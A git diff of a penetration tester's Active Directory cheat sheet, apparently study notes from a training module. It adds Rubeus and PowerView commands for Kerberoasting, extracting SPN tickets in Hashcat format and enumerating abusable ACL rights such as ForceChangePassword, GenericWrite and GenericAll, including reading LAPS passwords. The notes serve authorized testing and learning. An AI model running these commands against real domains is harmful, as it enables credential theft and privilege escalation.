@@ -1,4 +1,7 @@
 ## Scanning, Enumeration, Recon, External
+## Initial Access
+
+Enumerate users and spray passwords. Look for creds.
 
 Scan for live hosts on network
 ```
@@ -76,10 +79,6 @@ python3 windapsearch.py --dc-ip <172.16.5.5> -u <username>@<domainname.local> -p
 
 ```
 
-## Initial Access
-
-Enumerate users and spray passwords. Look for creds.
-
 ## Internal enumeration - Services, Accounts, Security Controls
 
 Credentialed enumeration - We're interested in information about domain user and computer attributes, group membership, Group Policy Objects, permissions, ACLs, trusts, and more.
@@ -138,3 +137,28 @@ Import-module .\PowerView.ps1
 Get-DomainUser * -spn | select samaccountname //list all users with SPN
 Get-DomainUser -Identity <user-from-list> | Get-DomainSPNTicket -Format Hashcat
 ```
+
+Kerberoasting with Rubeus - https://github.com/GhostPack/Rubeus
+```
+Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap //Request tickets for accounts with admincount attribute set to 1
+/tgtdeleg flag will only request RC4 tickets
+```
+
+Access Control List
+```
+ForceChangePassword - gives us the right to reset a user's password without first knowing their password (should be used cautiously and typically best to consult our client before resetting passwords).
+
+GenericWrite - gives us the right to write to any non-protected attribute on an object. If we have this access over a user, we could assign them an SPN and perform a Kerberoasting attack (which relies on the target account having a weak password set). Over a group means we could add ourselves or another security principal to a given group. Finally, if we have this access over a computer object, we could perform a resource-based constrained delegation attack which is outside the scope of this module.
+AddSelf - shows security groups that a user can add themselves to.
+
+GenericAll - this grants us full control over a target object. Again, depending on if this is granted over a user or group, we could modify group membership, force change a password, or perform a targeted Kerberoasting attack. If we have this access over a computer object and the Local Administrator Password Solution (LAPS) is in use in the environment, we can read the LAPS password and gain local admin access to the machine which may aid us in lateral movement or privilege escalation in the domain if we can obtain privileged controls or gain some sort of privileged access
+```
+
+ACL Enumeration with Powerview //Guids https://learn.microsoft.com/en-us/windows/win32/adschema/r-user-force-change-password //ResolveGUIDs flag will print guid as human-readable
+```
+Find-InterestingDomainAcl
+Import-Module Powerview.ps1
+$sid = Convert-NameToSid <name>
+Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid} 
+```
+
